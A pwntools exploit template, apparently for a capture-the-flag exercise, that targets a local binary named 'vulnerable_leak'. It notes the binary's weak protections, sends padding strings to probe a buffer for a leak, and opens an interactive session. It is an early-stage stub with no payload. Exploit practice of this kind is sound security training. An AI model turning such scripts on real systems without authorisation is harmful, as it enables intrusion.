#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template a.out
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('vulnerable_leak')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB

# context.terminal = ["urxvt", "-e", "bash", "-c"]
# args.GDB = True
gdbscript = '''
tbreak vulnerable
continue
'''.format(**locals())


#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

context.log_level="debug"

io = start()

# pid=str(util.proc.pidof(sh)[0])
# util.proc.wait_for_debugger(int(pid))

io.send("a"*25)
io.recvuntil("Give me the name")
io.send("a"*24)



io.interactive()
